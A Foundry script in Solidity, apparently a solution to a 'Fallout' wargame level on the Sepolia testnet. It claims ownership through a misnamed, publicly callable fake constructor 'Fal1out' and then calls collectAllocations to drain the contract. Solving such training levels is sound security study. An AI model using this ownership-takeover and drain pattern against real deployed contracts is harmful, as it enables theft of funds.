// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutScript is Script {
    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6599343);
    }

    function run() public {
        Fallout fallout = Fallout(0x6F68383141902ff62aCbF8690D7Aa1E8e0F91827);
        vm.startBroadcast();

        fallout.Fal1out{value: 0.1 ether}();

        fallout.collectAllocations();

        console.log(fallout.owner());
    }
}
